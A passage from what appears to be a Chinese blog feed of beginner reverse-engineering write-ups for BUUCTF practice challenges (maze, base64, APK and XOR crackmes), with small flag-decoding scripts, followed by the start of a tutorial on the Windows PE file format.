class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">         flag[i] = v1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524182739500.png" alt="image-20230524182739500"></p><p>因为不知道%26后得到的答案是几，所以用(int j;;j++)来无限例举</p><p>flag{KLDQCUDFZO}</p><p>KLDQCUDFZO</p>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-不一样的flag(9)</title>
      <link href="/2023/05/24/Re%E5%88%B7%E9%A2%98%E5%92%AF-9-BUU-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/"/>
      <url>/2023/05/24/Re%E5%88%B7%E9%A2%98%E5%92%AF-9-BUU-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/</url>
      
        <content type="html"><![CDATA[<p>是不是做习惯了常规的逆向题目？试试这道题，看你在能不能在程序中找到真正的flag！注意：flag并非是flag{XXX}形式，就是一个’字符串‘，考验眼力的时候到了！ 注意：得到的 flag 请包上 flag{} 提交</p><p>先运行一下程序</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524130011581.png" alt="image-20230524130011581"></p><p>看样子是一个玩游戏的程序</p><p>再看看壳</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524123118000.png" alt="image-20230524123118000"></p><p>无壳，是32位的</p><p>然后用IDA打开</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524130126298.png" alt="image-20230524130126298"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524130135982.png" alt="image-20230524130135982"></p><p>这个游戏的程序【注释好像没啥用】</p><p>差不多就是这样，喊你上下左右移动然后最后是”#”就能得到flag。</p><p>看了WP 后知道</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524130326952.png" alt="image-20230524130326952"></p><p>走0不走1</p><p>得到的222441144222</p><p>就是flag</p>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-reverse_3（8）</title>
      <link href="/2023/05/23/Re%E5%88%B7%E9%A2%98%E5%92%AF-8-BUU-reverse3/"/>
      <url>/2023/05/23/Re%E5%88%B7%E9%A2%98%E5%92%AF-8-BUU-reverse3/</url>
      
        <content type="html"><![CDATA[<h2 id="reverse3-注意：得到的-flag-请包上-flag-提交"><a href="#reverse3-注意：得到的-flag-请包上-flag-提交" class="headerlink" title="reverse3 注意：得到的 flag 请包上 flag{} 提交"></a>reverse3 注意：得到的 flag 请包上 flag{} 提交</h2><p>下载下来</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523213356033.png" alt="image-20230523213356033"></p><p>随便输入一下，直接退出。</p><p>用IDA 打开</p><p>找到关键的地方</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523230026795.png" alt="image-20230523230026795"></p><p>这里就是输入的东西放到Str，v3是你输入的字符串的长度，v4不知道，然后有一个strncpy 把你输入的东西 经过sub_4110BE 函数曹祖后的值 复制到了Destination 这里，然后 又进行了一次for 循环的操作，最后和e3nifIH9b_C@n@dH这个东西进行对比。</p><p>现在的主要关键就是sub_4110BE  这个函数</p><p>点进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">sub_411AB0</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+E0h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="type">void</span> *v12; <span class="comment">// [esp+F8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// [esp+104h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v9 = a2 / <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)(a2 / <span class="number">3</span>) % <span class="number">3</span> )</span><br><span class="line">    ++v9;</span><br><span class="line">  v10 = <span class="number">4</span> * v9;</span><br><span class="line">  *a3 = v10;</span><br><span class="line">  v12 = <span class="built_in">malloc</span>(v10 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  j_memset(v12, <span class="number">0</span>, v10 + <span class="number">1</span>);</span><br><span class="line">  v13 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_41A144[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_41A144[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_41A144[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span> &amp;&amp; v11 &gt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      byte_41A144[i] = *v13;</span><br><span class="line">      --v11;</span><br><span class="line">      ++v13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v5 = v4 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)v12 + v5) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        *((_BYTE *)v12 + ++v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        v4 = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v6 = v4 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)v12 + v6) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v6) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v6) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        v4 = v6 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v7 = v4 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)v12 + v7) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v7) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v7) = aAbcdefghijklmn[byte_41A144[<span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">        v4 = v7 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)v12 + v4) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br></pre></td></tr></table></figure><p>得到这样的一个东西，人傻了…</p><p>奇奇怪怪的</p><p>点进去就看到</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523230713086.png" alt="image-20230523230713086"></p><p>就看到这个东西 ， 及看到这个= 号 我就觉得是base64</p><p>先不管它，先把能逆向的代码先搞出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> a[<span class="number">100</span>] = <span class="string">&quot;e3nifIH9b_C@n@dH\0&quot;</span>;</span><br><span class="line"><span class="type">char</span> b[<span class="keyword">sizeof</span>(a)<span class="number">-1</span>];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a); ++i) &#123;</span><br><span class="line">b[i] = a[i] - i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, b[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523232757490.png" alt="image-20230523232757490"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523232435804.png" alt="image-20230523232435804"></p>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-helloword（7）</title>
      <link href="/2023/05/23/Re%E5%88%B7%E9%A2%98%E5%92%AF-7-BUU-helloword/"/>
      <url>/2023/05/23/Re%E5%88%B7%E9%A2%98%E5%92%AF-7-BUU-helloword/</url>
      
        <content type="html"><![CDATA[<p>有难的题目，也就有简单的题目，就像程序员一辈子编写的第一个程序，极有可能是helloword，它很普通，但是也很让人怀念。你猜这题flag在哪里？让我们怀念第一次编写的easy程序吧！ 注意：得到的 flag 请包上 flag{} 提交</p><p>下载下来是一个apk 文件</p><p>这个文件  是APK是AndroidPackage的缩写，即Android安装包(apk)。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523212926864.png" alt="image-20230523212926864" style="zoom:50%;" /><p>我用雷电模拟器打开后就是这样的…</p><p>使用AndroidKill工具进分析</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523213118019.png" alt="image-20230523213118019"></p><p>直接就得到了flag</p>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-xor（6）</title>
      <link href="/2023/05/23/Re%E5%88%B7%E9%A2%98%E5%92%AF-6-BUU-xor/"/>
      <url>/2023/05/23/Re%E5%88%B7%E9%A2%98%E5%92%AF-6-BUU-xor/</url>
      
        <content type="html"><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>or的敌人，and 有个兄弟叫or,or有个敌人叫xor，那么你能帮助or战胜他的敌人xor吗，xor的奥秘就在附件中，开始战斗吧！ 注意：得到的 flag 请包上 flag{} 提交</p><p>拿到题目，xor  用die  看一下</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523180025934.png" alt="image-20230523180025934"></p><p>看到了是一个Mach-064 ， mach 不知道是啥，但是知道是64位的。</p><p><a href="https://product.pconline.com.cn/itbk/software/os/1112/2610866.html">https://product.pconline.com.cn/itbk/software/os/1112/2610866.html</a></p><p>百度解释：</p><p>Mach是一个由卡内基梅隆大学开发的用于支持操作系统研究的操作系统内核，为了用于操作系统之研究，特别是在分布式与并行运算上。是最早实现微核心操作系统的例子之一，是许多其它相似的项目的标准。</p><p>这个都是无所谓的，不影响我写这个题。</p><p>得知这个是64位的，并且没有壳，用IDA打开</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523180234632.png" alt="image-20230523180234632"></p><p>看得出来，我很依赖F5 ， 【这里我是用IDA7.7反编译出来的。它和7.0出来的不太一样，但是整体上是差不多的】</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-124h]</span></span><br><span class="line">  <span class="type">char</span> __b[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-110h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(__b, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag:\n&quot;</span>);</span><br><span class="line">  get_line(__b, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(__b) != <span class="number">33</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )</span><br><span class="line">    __b[i] ^= __b[i - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(__b, global, <span class="number">33uLL</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>memset(__b, 0, 0x100uLL);</li></ul><p>这句话就是把__b中的内容全部替换成0</p><ul><li>  get_line(__b, 0x100u);</li></ul><p>虽然我不知道这个是干嘛的，但是我知道，上面有一个printf(“Input your flag:\n”);，大概就能猜测这个就是叫我们输入的东西，也就是我们传入的参数，接收我们的传入的东西，然后保存到__b中</p><ul><li>if ( strlen(__b) != 33 )<pre><code>goto LABEL_7;</code></pre></li></ul><p>说明__b的长度必须得是33，不然就跳走了</p><ul><li>```<br>  for ( i = 1; i &lt; 33; ++i )<pre><code>__b[i] ^= __b[i - 1];</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这个是xor 进行一次操作，看到这里，和题目相互对应，我就知道位置肯定是对的了</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  if ( !strncmp(__b, global, 33uLL) )</span><br><span class="line">      printf(&quot;Success&quot;);</span><br></pre></td></tr></table></figure></li></ul><p>这里是比对，进行变换后的__b和程序中原本自带的global 进行比对，如果是对的，那么就能得到flag 。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523180859668.png" alt="image-20230523180859668"></p><p>这个global 点过去，就看到这个是一个offset 偏移地址 【肯定是一个数组】然后下面耶写出了这个数组的内容。</p><p>当然我们再点过去</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523181011753.png" alt="image-20230523181011753"></p><p>现在就完美的看到了数组里面的内容。</p><p>这里按下<strong>shift + e</strong>【新学的东西】 可以直接提取出来</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523181333279.png" alt="image-20230523181333279"></p><p>这个就是global 数组中的数据。</p><p>ok 现在就是写脚本，然后就能得到flag</p><p><strong>第一种</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line">a =[<span class="number">102</span>, <span class="number">10</span>, <span class="number">107</span>, <span class="number">12</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">79</span>, <span class="number">46</span>, <span class="number">64</span>, <span class="number">17</span>,<span class="number">120</span>, <span class="number">13</span>, <span class="number">90</span>, <span class="number">59</span>, <span class="number">85</span>, <span class="number">17</span>, <span class="number">112</span>, <span class="number">25</span>, <span class="number">70</span>, <span class="number">31</span>,<span class="number">118</span>, <span class="number">34</span>, <span class="number">77</span>, <span class="number">35</span>, <span class="number">68</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">6</span>, <span class="number">104</span>, <span class="number">15</span>,<span class="number">71</span>, <span class="number">50</span>, <span class="number">79</span>, <span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>):</span><br><span class="line">    s+= <span class="built_in">chr</span>(a[i]^a[i-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>第二种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="string">&#x27;f&#x27;</span>,<span class="number">0xA</span>,<span class="string">&#x27;k&#x27;</span>,<span class="number">0xC</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">0xD</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;p&#x27;</span>,<span class="number">0x19</span>,<span class="string">&#x27;F&#x27;</span>,<span class="number">0x1F</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="number">0xE</span>,<span class="string">&#x27;g&#x27;</span>,<span class="number">6</span>,<span class="string">&#x27;h&#x27;</span>,<span class="number">0xF</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;O&#x27;</span>]</span><br><span class="line">flag = <span class="string">&#x27;f&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isinstance</span>(s[i],<span class="built_in">int</span>)):<span class="comment">#将数字转化为字符</span></span><br><span class="line">        s[i] = <span class="built_in">chr</span>(s[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i]) ^ <span class="built_in">ord</span>(s[i-<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>用c 语言写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">102</span>,  <span class="number">10</span>, <span class="number">107</span>,  <span class="number">12</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">79</span>,  <span class="number">46</span>,  <span class="number">64</span>,  <span class="number">17</span>,</span><br><span class="line">  <span class="number">120</span>,  <span class="number">13</span>,  <span class="number">90</span>,  <span class="number">59</span>,  <span class="number">85</span>,  <span class="number">17</span>, <span class="number">112</span>,  <span class="number">25</span>,  <span class="number">70</span>,  <span class="number">31</span>,</span><br><span class="line">  <span class="number">118</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">35</span>,  <span class="number">68</span>,  <span class="number">14</span>, <span class="number">103</span>,   <span class="number">6</span>, <span class="number">104</span>,  <span class="number">15</span>,</span><br><span class="line">   <span class="number">71</span>,  <span class="number">50</span>,  <span class="number">79</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> b[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">b[i] = a[i]^a[i+<span class="number">1</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, b[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我想说能不能爆破呢？</p>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PE文件结构基础（28）</title>
      <link href="/2023/05/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-28-PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%8F%8A%E8%8A%82%E8%A1%A8%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/"/>
      <url>/2023/05/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-28-PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%8F%8A%E8%8A%82%E8%A1%A8%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-PE文件结构简介"><a href="#1-PE文件结构简介" class="headerlink" title="1.PE文件结构简介"></a>1.PE文件结构简介</h1><p>PE 文件就是windows下可执行文件的总称，常见的有：<strong>DLL，EXE，OCX，SYS</strong>。</p><p>Windows 是如何区分可执行文件的呢？也许你会说文件扩展名，但我要告诉你，这是错误的。因为这个是涉及到PE结构的。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523134431288.png" alt="image-20230523134431288"></p><p><strong>DOS头</strong>是用来兼容MS-DOS操作系统的，目标一般是用来指明NT头在文件中的位置</p><p><strong>NT头</strong>包含windows PE文件的主要信息，其中包括一个‘PE’字样的签名，PE文件头【IMAGE_FILE_HEADER】和PE可选头【IMAGE_OPTIONAL_HEADER32】，头部的详细结构以及其具有意义在PE文件头文章中详细描述</p><p><strong>节表</strong>是PE文件后续节的描述，windows根据节表的描述加载每个节</p><p><strong>节</strong>每个节实际上是一个容器，可以包含代码，数据…每个节可以有独立的内存权限，比如代码节默认有读/执行权限，节的名字和数量是可以自己定义的【不一定就是上图中的三个】</p><p>当一个PE文件被加载到内存中以后，就称之“映像【image】”，一般来说，PE文件在硬盘上和内存是不完全一样的，被加载到内存以后占用的虚拟地址空间要比硬盘上占用的空间大一些，这是因为：各个节在硬盘上是连续的，但是在内存中是按照耶对齐的，所以加载到内存以后节之间会出现一些“空洞”</p><p>因为存在这种对齐，所以在PE结构内部，表示某个位置的地址采用了两种方式：</p><ul><li><p>1.针对在硬盘上存储文件中的地址，称为原始存储地址或者物理地址表示距离文件头的偏移；</p></li><li><p>2.另外一种是针对加载到内存以后映像中的地址，称为相对虚拟地址【RVA】，表示相对内存映像头的偏移</p></li></ul><p>然而CPU的某些指令是需要使用绝对地址的，比如取全局变量的地址，传递函数的地址  编译以后的汇编指令中肯定需要用到绝对地址而不是相对映像头的偏移，因此PE文件会建议操作系统将其加载到某个内存地址【这个叫基地址】，编译器便根据这个地址求出代码中一些全局变量和函数的地址，并将这些地址用到对应的指令中。</p><h2 id="可执行文件头"><a href="#可执行文件头" class="headerlink" 